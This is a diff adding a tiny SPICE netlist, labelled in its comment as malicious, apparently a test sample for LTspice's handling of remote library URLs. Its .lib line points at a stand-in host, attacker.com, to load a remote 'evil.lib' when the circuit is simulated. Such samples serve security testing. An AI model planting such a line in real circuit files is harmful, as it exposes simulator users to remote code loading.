@@ -1,0 +1,6 @@
+* Malicious netlist -- LTspice URL .lib to load remote code
+R1 in out 1k
+V1 in 0 1
+.lib http://attacker.com/evil.lib
+.tran 1u
+.end
